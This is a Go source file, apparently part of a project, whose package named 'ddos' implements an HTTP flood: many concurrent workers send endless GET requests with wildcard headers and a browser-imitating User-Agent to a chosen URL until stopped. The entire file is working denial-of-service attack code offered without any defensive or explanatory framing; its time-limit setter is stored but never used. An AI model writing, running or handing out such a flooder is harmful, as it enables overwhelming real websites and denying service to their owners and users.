package ddos

import (
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"runtime"
	"strings"
	"sync"
	"time"
)

func NewFlooder(url string) *flooder {
	return &flooder{
		url: url,
		header: []string{
			"Accept: */*",
			"Accept-Encoding: *",
			"Accept-Language: *",
			"Accept-Charset: *",
		},
		workerAmount: 0,
		client:       http.DefaultClient,
		stopSignal:   make(chan bool),
	}
}

type Flooder interface {
	Flood()
	Stop()
	SetWorkerAmount(workers uint16)
	SetFloodTime(seconds int32)
}

type flooder struct {
	url          string
	header       []string
	client       *http.Client
	workerAmount uint16
	stopSignal   chan bool
	duration     time.Duration
	wg           sync.WaitGroup
}

func (f *flooder) Flood(startSignal ...*<-chan bool) {
	defaultRequest := f.configRequest()

	for idx := uint16(0); idx < f.workerAmount; idx++ {
		if startSignal != nil {
			<-(*startSignal[0])
		}

		f.wg.Add(1)
		go func() {
			defer f.wg.Done()
			f.flood(defaultRequest)
		}()
	}

	f.wg.Wait()
}

func (f flooder) configRequest() *http.Request {
	defaultRequest, err := http.NewRequest(http.MethodGet, f.url, nil)
	if err != nil {
		log.Fatal(err)
	}

	for _, header := range f.header {
		splitedHeader := strings.SplitN(header, ":", 2)
		if len(splitedHeader) == 2 {
			defaultRequest.Header.Add(strings.TrimSpace(splitedHeader[0]), strings.TrimSpace(splitedHeader[1]))
		}
	}

	defaultRequest.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")
	return defaultRequest
}

func (f *flooder) flood(request *http.Request) {
	for {
		select {
		case <-f.stopSignal:
			return
		default:
			resp, err := f.client.Do(request)
			if err == nil {
				_, copyErr := io.Copy(ioutil.Discard, resp.Body)
				closeErr := resp.Body.Close()
				if copyErr != nil || closeErr != nil {
					log.Printf("Error occurred during response body copy or close: %v, %v", copyErr, closeErr)
				}
			} else {
				log.Printf("Error occurred during HTTP request: %v", err)
			}
		}
		runtime.Gosched()
	}
}

func (f *flooder) Stop() {
	close(f.stopSignal)
	f.wg.Wait()
}

func (f *flooder) SetWorkerAmount(workers uint16) {
	f.workerAmount = workers
}

func (f *flooder) SetFloodTime(seconds int32) {
	f.duration = time.Duration(seconds) * time.Second
}
